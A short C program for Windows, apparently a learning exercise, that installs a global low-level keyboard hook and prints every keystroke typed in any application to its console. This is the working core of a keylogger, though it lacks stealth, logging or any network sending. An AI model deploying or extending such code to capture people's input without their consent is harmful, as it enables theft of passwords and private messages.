#include <stdio.h>
#include <Windows.h>

HHOOK hook;

LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam);
int main() {
	MSG msg;
	hook = SetWindowsHookExA(WH_KEYBOARD_LL, funcHook, NULL, 0);
	if (hook == NULL) {
		printf("Erro no hook\n");
		return(1);
	}
	while (GetMessage(&msg, NULL, 0, 0) != 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;
	printf("%c", kbDllHook->vkCode);
	return(CallNextHookEx(hook, codigo, wParam, lParam));
}
